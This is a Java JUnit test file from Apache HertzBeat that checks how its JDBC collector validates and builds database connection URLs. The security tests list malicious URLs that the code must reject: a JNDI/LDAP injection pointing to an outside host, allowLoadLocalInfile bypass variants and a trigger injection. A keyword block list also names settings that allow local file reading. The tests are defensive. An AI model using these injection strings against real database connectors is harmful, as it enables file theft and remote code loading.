/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.apache.hertzbeat.collector.collect.database;

import org.apache.hertzbeat.collector.dispatch.DispatchConstants;
import org.apache.hertzbeat.common.entity.job.Metrics;
import org.apache.hertzbeat.common.entity.job.protocol.JdbcProtocol;
import org.apache.hertzbeat.common.entity.message.CollectRep;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * Test case for {@link JdbcCommonCollect}
 */
class JdbcCommonCollectTest {
    private JdbcCommonCollect jdbcCommonCollect;

    @BeforeEach
    void setup() {
        jdbcCommonCollect = new JdbcCommonCollect();
    }

    @Test
    void preCheck() {
        assertThrows(IllegalArgumentException.class, () -> {
            jdbcCommonCollect.preCheck(null);
        });
        assertThrows(IllegalArgumentException.class, () -> {
            Metrics metrics = new Metrics();
            jdbcCommonCollect.preCheck(metrics);
        });

        assertDoesNotThrow(() -> {
            JdbcProtocol jdbc = new JdbcProtocol();
            jdbc.setUrl("jdbc:mysql://localhost:3306/test");

            Metrics metrics = new Metrics();
            metrics.setJdbc(jdbc);
            jdbcCommonCollect.preCheck(metrics);
        });

        String[] invalidKeywords = new String[]{
            "allowLoadLocalInfile", "allowLoadLocalInfileInPath", "useLocalInfile"
        };
        for (String keyword : invalidKeywords) {
            // contains not allowed keywords
            assertThrows(IllegalArgumentException.class, () -> {
                JdbcProtocol jdbc = new JdbcProtocol();
                jdbc.setUrl("jdbc:mysql://localhost:3306/test?" + keyword);
    
                Metrics metrics = new Metrics();
                metrics.setJdbc(jdbc);
                jdbcCommonCollect.preCheck(metrics);
            });
        }
    }

    @Test
    void collect() {
        assertDoesNotThrow(() -> {
            JdbcProtocol jdbc = new JdbcProtocol();
            jdbc.setUrl("jdbc:mysql://localhost:3306/test");
            jdbc.setUsername("root");
            jdbc.setPassword("123456");
            jdbc.setQueryType("select");

            Metrics metrics = new Metrics();
            metrics.setJdbc(jdbc);

            CollectRep.MetricsData.Builder builder = CollectRep.MetricsData.newBuilder();
            jdbcCommonCollect.collect(builder, metrics);
        });
    }

    @Test
    void supportProtocol() {
        String protocol = jdbcCommonCollect.supportProtocol();
        assertEquals(DispatchConstants.PROTOCOL_JDBC, protocol);
    }

    @Test
    void testUrlPassThrough() {
        String[] testUrls = {
                "jdbc:mysql://localhost:3306/test?allowPublicKeyRetrieval=true&useSSL=false",
                "jdbc:mysql://localhost:3306/test?usessl=false&verifyServerCertificate=true",
                "jdbc:mysql://localhost:3306/test?serverTimezone=UTC&autoReconnect=false"
        };
        JdbcCommonCollect jdbcCollect = new JdbcCommonCollect();
        for (String originalUrl : testUrls) {
            try {
                JdbcProtocol jdbcProtocol = JdbcProtocol.builder()
                        .host("localhost")
                        .port("3306")
                        .platform("mysql")
                        .username("root")
                        .password("root")
                        .database("test")
                        .url(originalUrl)
                        .build();

                String processedUrl = constructDatabaseUrl(jdbcCollect, jdbcProtocol, "localhost", "3306");
                // Verify that the processed URL is the same as the original URL
                assertEquals(originalUrl, processedUrl,
                    "URL should be passed through without modification: " + originalUrl);
            } catch (Exception e) {
                System.out.println("URL rejected by security validation: " + originalUrl + ", reason: " + e.getMessage());
            }
        }
    }

    @Test
    void testConstructDatabaseUrlByPlatform() throws Exception {
        Map<String, String> expectedUrls = new LinkedHashMap<>();
        expectedUrls.put("mysql", "jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=utf-8&useSSL=false");
        expectedUrls.put("mariadb", "jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=utf-8&useSSL=false");
        expectedUrls.put("postgresql", "jdbc:postgresql://localhost:3306/test");
        expectedUrls.put("clickhouse", "jdbc:clickhouse://localhost:3306/test");
        expectedUrls.put("sqlserver", "jdbc:sqlserver://localhost:3306;DatabaseName=test;trustServerCertificate=true;");
        expectedUrls.put("oracle", "jdbc:oracle:thin:@localhost:3306/test");
        expectedUrls.put("dm", "jdbc:dm://localhost:3306");

        for (Map.Entry<String, String> entry : expectedUrls.entrySet()) {
            JdbcProtocol jdbcProtocol = JdbcProtocol.builder()
                    .platform(entry.getKey())
                    .database("test")
                    .build();

            assertEquals(entry.getValue(), constructDatabaseUrl(jdbcCommonCollect, jdbcProtocol, "localhost", "3306"));
        }
    }

    @Test
    void testConstructDatabaseUrlRejectsUnsupportedPlatform() {
        JdbcProtocol jdbcProtocol = JdbcProtocol.builder()
                .platform("invalid")
                .database("test")
                .build();

        IllegalArgumentException exception = assertThrows(IllegalArgumentException.class,
                () -> constructDatabaseUrl(jdbcCommonCollect, jdbcProtocol, "localhost", "3306"));
        assertEquals("Not support database platform: invalid", exception.getMessage());
    }

    @Test
    void testConstructDatabaseUrlSecurityInterception() {
        JdbcCommonCollect jdbcCollect = new JdbcCommonCollect();
        String[] maliciousUrls = {
                // URL length limit test
                "jdbc:mysql://localhost:3306/test?" + "a".repeat(2050) + "=value",
                // url format check
                "jdbca:mysql://localhost:3306/test?allowLoadLocalInfile=true",
                // backlist check
                "jdbc:mysql://localhost:3306/test?allowLoadLocalInfile=true",
                // universal detection of JDBC injection and deserialization attacks
                "jdbc:mysql://localhost:3306/test?jndi:ldap://duansg.com/exploit",
                // universal detection of bypass
                "jdbc:mysql://localhost:3306/test?param=create\\trigger",
                // database platform specific bypass detection
                "jdbc:mysql://localhost:3306/test?allow\\nload\\nlocal\\ninfile=true"

        };

        // Test malicious URLs - should throw exceptions
        for (String maliciousUrl : maliciousUrls) {
            JdbcProtocol jdbcProtocol = JdbcProtocol.builder()
                    .host("localhost")
                    .port("3306")
                    .platform("mysql")
                    .username("root")
                    .password("root")
                    .database("test")
                    .url(maliciousUrl)
                    .build();

            assertThrows(Exception.class, () -> {
                constructDatabaseUrl(jdbcCollect, jdbcProtocol, "localhost", "3306");
            }, "Malicious URL should be blocked: " + maliciousUrl);
        }
    }

    private String constructDatabaseUrl(JdbcCommonCollect jdbcCollect, JdbcProtocol jdbcProtocol,
                                        String host, String port) throws Exception {
        try {
            Method constructMethod = JdbcCommonCollect.class
                    .getDeclaredMethod("constructDatabaseUrl", JdbcProtocol.class, String.class, String.class);
            constructMethod.setAccessible(true);
            return (String) constructMethod.invoke(jdbcCollect, jdbcProtocol, host, port);
        } catch (InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof Exception exception) {
                throw exception;
            }
            if (cause instanceof Error error) {
                throw error;
            }
            throw new RuntimeException(cause);
        }
    }

}
